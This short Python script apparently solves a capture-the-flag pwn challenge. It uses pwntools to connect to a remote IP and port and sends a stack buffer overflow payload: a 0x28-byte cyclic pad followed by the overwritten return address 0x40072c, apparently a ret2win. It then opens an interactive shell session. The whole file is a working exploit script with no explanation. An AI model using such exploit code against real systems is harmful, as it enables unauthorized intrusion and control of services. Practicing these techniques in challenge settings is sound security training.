from pwn import *

# io=process("./r3m4ke1t")
io=remote("1.14.71.254",28640)

io.recvuntil(b"\n")
payload=cyclic(0x28)+p64(0x40072c)
io.sendline(payload)
io.interactive()

